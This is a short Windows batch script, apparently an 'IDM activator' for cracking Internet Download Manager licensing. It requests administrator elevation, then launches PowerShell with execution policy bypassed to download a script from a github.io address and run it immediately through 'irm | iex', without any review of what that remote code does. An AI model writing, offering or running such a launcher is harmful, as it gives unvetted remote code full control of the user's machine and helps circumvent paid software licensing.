@echo off
:: Check for admin rights
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting administrative privileges...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: Run PowerShell command to activate IDM
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm -useb https://naeembolchhi.github.io/IDM-Activator/IDMA.ps1 | iex"


